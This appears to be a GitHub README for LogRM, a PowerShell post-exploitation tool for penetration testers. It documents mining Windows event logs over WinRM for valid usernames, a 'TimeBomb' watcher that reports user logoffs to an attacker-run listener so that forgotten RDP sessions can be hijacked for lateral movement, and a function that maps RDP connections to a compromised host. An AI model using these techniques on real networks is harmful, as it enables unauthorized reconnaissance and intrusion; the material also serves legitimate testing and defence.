# LogRM
LogRM is a post exploitation powershell script which it uses windows event logs to gather information about internal network in a pentration testing engagment. It is not only useful for blue teams but also for red teams because some of its functionalities can be used for lateral movement. You will be able to use LogRM not only on a localhost machine but also in a remote machine using WinRM protocol which is by default enabled in a newly Windows versions. 


## Configuration

In some cases may be you need to configure WinRM protocol to be functional

On client side (attacker):

	winrm quickconfig
	winrm set winrm/config/client '@{TrustedHosts="*"}'
		
On the server side (victim):
		
	Enable-PSRemoting -Force
	winrm quickconfig


## Usage

Use can use the following event types:

1) Information EventID (4624) - An account was successfully logged on
2) Information EventID (4625) - An account failed to log on
3) Information EventID (4728) - A member was added to a security-enabled global group 
4) Information EventID (4732) - A member was added to a security-enabled local group
5) Information EventID (4733) - A member was removed from a security-enabled local group
6) Information EventID (4738) - A user account was changed
7) Information EventID (4647) - User initiated logoff
8) Information EventID (4688) - A new process has been created
9) Information EventID (4776) - The domain controller attempted to validate the credentials for an account


### Examples

The LogRM searching into newest 10(default value) entries into all event types.

```
PS> LogRM -user <username> -pass <password> -ip <remote winrm ip>
PS> LogRM -user <username> -pass <password> -fips <file with ips>
PS> LogRM -ip 127.0.0.1
```

Search into specific eventID using -eventID parameter
```
PS> LogRM -user <username> -pass <password> -ip <remote winrm ip> -eventID <eventID>
PS> LogRM -user <username> -pass <password> -fips <file with ips> -eventID <eventID>
PS> LogRM -ip 127.0.0.1 -eventID <eventID> 
```

![alt text](https://github.com/tasox/LogRM/blob/master/example1_.png)

If you use -newest parameter then you will be able to search into a specific quantity of entries and in many cases your results will be more accurate.

```
PS> LogRM -user <username> -pass <password> -ip <remote winrm ip> -newest <number>
PS> LogRM -user <username> -pass <password> -fips <file with ips> -newest <number>
PS> LogRM -ip 127.0.0.1 -newest <number>
```

![alt text](https://github.com/tasox/LogRM/blob/master/example2_.png)

Providing the -users flag you will get as a result some valid usernames. The LogRM searches into these event IDs 4624,4625,4776 

```
PS> LogRM -user <username> -pass <password> -ip <remote winrm ip> -users
PS> LogRM -user <username> -pass <password> -fips <file with ips> -users
PS> LogRM -ip 127.0.0.1 -users
```

In earlier windows versions for example Windows server 2008, you can not have more than 5 winrm connections with the same host

## Time Bomb 

TimeBomb is useful when you landed on a network host and you want to get a notification when the user is logged of and be able to use an RDP (Remote Desktop) connection. If the user has a remote desktop with another network host and after logging out left the remote desktop open then you could move into the network from an existing forgotten RDP connection. You can create a timer without creating or editing windows schedules and leave the host untouched. You have 3 option when you create a timeBomb:

1) now
2) once
3) trigger

Timebomb uses the following events:

1) Information EventID (4624) - An account was successfully logged on
2) Information EventID (4647) - User initiated logoff
3) Information Event ID (4778) - A session was reconnected to a Window Station
4) Information Event ID (4779) - A session was disconnected from a Window Station
5) Information Event ID (4800) - The workstation was locked
6) Information Event ID (4801) - The workstation was unlocked
7) Information Event ID (4802) - The screen saver was invoked
8) Information Event ID (4803) - The screen saver was dismissed

Tip1: Give as much as possible amount of entries in -newest parameter. For example: 5000

Tip2: If you want to get notifications only from users who have open RDP connection(s) before logged out then you should uncomment the line 785


###  Intro to Windows events

Before use timebomb we have to learn the differences between windows events. Events 4778/4779 is fired up when the user is currently logged in and uses switch button to move quickly between users without locked or logout from his terminal. Events 4800 is fired up when the user press the button from keyboard (window+L) or with his mouse on start button press lockout. On the other hand 4801 is fired up after using ctrl+alt+del. Sometimes users uses screensavers not only for powersaving but also to lock their machines, in this case 4802/4803 are taking place. 

Information: In windows server 2008 events 4800/4801/4802/4803 are not created without a policy.


### Usage


The task is going to run now
```
PS> timeBomb -task now -newest <give a big number>
PS> timeBomb -task now -ip 127.0.0.1 -newest <give a big number>
```

The task is going to run now and if the user is logged of or if the screen saver is invoked then you will get a message.
```
PS> timeBomb -task now -newest <give a big number> -reverseHost <Python server ip> -reversePort <Python server port>
PS> timeBomb -task now -ip 127.0.0.1 -newest <give a big number> -reverseHost <Python server ip> -reversePort <Python server port>
```

#### Example 1 - User is logged of -> Login (easy)

![alt text](https://github.com/tasox/LogRM/blob/master/user_is_loggedOf.png)


#### Example 2 - Screen saver is invoked -> Login (easy)

![alt text](https://github.com/tasox/LogRM/blob/master/scrren_saver_is_invoked.png)


##### if you run the script again after a while you will see the following result. 'Screensaver is invoked' as well as the 'Workstation is locked'.

![alt text](https://github.com/tasox/LogRM/blob/master/scrren_saver_is_invoked2.png)

#### Example 3 - Switch between users -> Login (medium)

In this scenario the user does not log of nor lock out from his account but instead of this uses "switch" between different accounts. The script will inform us that user's workstation is locked but this doesn't mean in all cases as you will see later that the user is not inside. To accomplish a successful login we have to observe the time of user's disconnection.

![alt_text](https://github.com/tasox/LogRM/blob/master/switch_between_users.png)


The task is going to run once at specific time.
```
PS> timeBomb -task once -at 15:00 -newest <give a big number> -reverseHost <Python server ip> -reversePort <Python server port>
PS> timeBomb -task once -at 15:00 -ip 127.0.0.1 -newest <give a big number> -reverseHost <Python server ip> -reversePort <Python server port>
```

#### Example 1 - User is logged of

![alt text](https://github.com/tasox/LogRM/blob/master/timBomb_task_once.png)


The task is going to run and stop at specific time.
```
PS> timeBomb -task trigger -at 15:00 -stoptime 16:00 -newest <give a big number> -reverseHost <Python server ip> -reversePort <Python server port>
PS> timeBomb -task trigger -at 15:00 -stoptime 16:00 -ip 127.0.0.1 -newest <give a big number> -reverseHost <Python server ip> -reversePort <Python server port>
```

## Active Remote Desktop Sessions

RDPConn function gets only valid incoming RDP connections into the compromised host. By using this function you will be able to observe which users from which machines have connection with our host without interrupt their connection if we tried to login with the same credentials.

RDPConn function uses the following events

1) User authentication succeeded - 1149
2) Session reconnection succeeded - 25
3) Session has been disconneted - 24

Note: In the next update i will add event 21 for remote desktop services.

```
PS> RDPConn
PS> RDPConn -ip 127.0.0.1
```

#### Example 1

![alt text](https://github.com/tasox/LogRM/blob/master/RDP_winrm.png)



## Authors

* TasoX (@taso_x)



